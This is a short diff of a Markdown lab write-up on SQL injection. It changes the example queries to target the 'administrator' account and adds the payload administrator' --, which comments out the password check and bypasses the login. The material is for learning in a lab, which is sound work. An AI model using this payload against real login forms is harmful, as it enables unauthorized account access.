@@ -18,15 +18,15 @@ To solve the lab, perform a SQL injection attack that logs in to the application
 ### Query original:
 
 ````sql
-select id,username,subscription from users where username = 'F0n3' and password = 'p@ssw0rd123-1';
+select id,username,subscription from users where username = 'administrator' and password = 'p@ssw0rd123-1';
 ````
 
 ### Query inyectada:
 
 ````sql
-select id,username,subscription from users where username = 'F0n3' -- and password = 'p@ssw0rd123-1';
+select id,username,subscription from users where username = 'administrator' -- and password = 'p@ssw0rd123-1';
 ````
-
+administrator' --
 ![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/4cd5611e-0aac-435f-a45d-4a254b669186)
 
 
